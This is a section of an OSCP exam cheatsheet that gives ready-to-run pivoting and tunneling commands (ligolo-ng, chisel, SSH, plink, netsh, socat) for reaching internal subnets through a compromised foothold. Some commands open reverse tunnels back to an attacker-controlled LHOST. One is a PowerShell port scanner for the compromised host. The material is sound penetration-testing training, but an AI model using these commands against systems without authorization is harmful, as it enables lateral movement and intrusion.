# 06 · Pivoting & Tunneling

> Part of the **OSCP/OSCP+ cheatsheet** — [← back to index](README.md)

---

## PIVOTING / PORT FORWARDING / TUNNELING

> Needed for AD (reach hosts behind a foothold) and for internal-only services. **Metasploit is NOT allowed for pivoting** — use the below.

### ligolo-ng (recommended — clean, fast, full subnet access)
```bash
# On YOUR box (proxy/server):
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                 # starts listener on :11601
# add route to target internal subnet (do AFTER agent connects, in ligolo console):
#   session -> select agent -> then on your box:
sudo ip route add 10.10.20.0/24 dev ligolo
# On the FOOTHOLD host (agent):
./agent -connect LHOST:11601 -ignore-cert
# In ligolo console: session ; start    -> now reach 10.10.20.0/24 directly with ANY tool
# Expose a local listener to the agent network (for reverse shells back): 
#   listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
```

### chisel (SOCKS proxy via HTTP — Dante pattern)
```bash
# Your box (server):
./chisel server -p 8000 --reverse
# Foothold (client) -> reverse SOCKS5:
./chisel client LHOST:8000 R:1080:socks
# Then proxychains everything:
#   /etc/proxychains4.conf -> socks5 127.0.0.1 1080
proxychains nxc smb 10.10.20.0/24 -u user -p pass
proxychains nmap -sT -Pn 10.10.20.5
# Forward a single internal port out instead of SOCKS:
./chisel client LHOST:8000 R:3389:10.10.20.5:3389
```

### SSH tunneling (when you have SSH creds/keys)
```bash
ssh -L 8080:127.0.0.1:8080 user@$IP        # local: hit target's internal :8080 on your 8080
ssh -R 9001:127.0.0.1:9001 user@$IP        # remote: expose your service to target
ssh -D 1080 user@$IP                       # dynamic SOCKS -> proxychains
ssh -fN -L ...                             # background, no shell
# Reach a 3rd host through the SSH host:
ssh -L 3389:10.10.20.5:3389 user@$IP
```

### sshuttle (VPN-like, no proxychains needed)
```bash
sshuttle -r user@$IP 10.10.20.0/24 --ssh-cmd "ssh -i key"
```

### Windows pivot
```cmd
# No nmap on the pivot host? scan from PowerShell (LOLBin):
powershell -c "1..1024 | % { if((New-Object Net.Sockets.TcpClient).ConnectAsync('10.10.20.5',$_).Wait(200)){\"$_ open\"} }"
Test-NetConnection -Port 445 10.10.20.5
# plink (CLI PuTTY) reverse tunnel when no OpenSSH:
plink.exe -ssh -l kali -pw PASS -R 127.0.0.1:3389:10.10.20.5:3389 LHOST
# plink (chisel-style) or netsh portproxy:
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.20.5
# socat relay (if available)
socat TCP-LISTEN:8080,fork TCP:10.10.20.5:80
```

### proxychains tips
- Use `-sT` (TCP connect) with nmap over proxychains; SYN scans don't work.
- Set `proxy_dns` off for speed; lower timeouts in conf if scans crawl.

---
